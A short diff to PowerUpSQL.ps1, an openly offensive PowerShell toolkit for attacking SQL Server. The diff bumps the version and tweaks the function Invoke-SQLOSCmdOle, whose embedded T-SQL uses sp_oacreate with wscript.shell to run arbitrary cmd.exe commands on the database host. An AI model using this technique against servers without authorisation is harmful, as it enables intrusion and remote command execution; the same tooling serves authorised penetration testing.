@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.83
+        Version: 1.0.0.84
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -1512,7 +1512,7 @@ Function  Invoke-SQLOSCmdOle
 @"
 DECLARE @Shell INT
 DECLARE @Output varchar(8000)
-EXEC @Output = Sp_oacreate 'wscript.shell' , @Shell Output
+EXEC @Output = Sp_oacreate 'wscript.shell', @Shell Output, 5
 EXEC Sp_oamethod @shell, 'run' , null, 'cmd.exe /c "$Command > $OutputPath"' 
 "@
                 # Execute query    
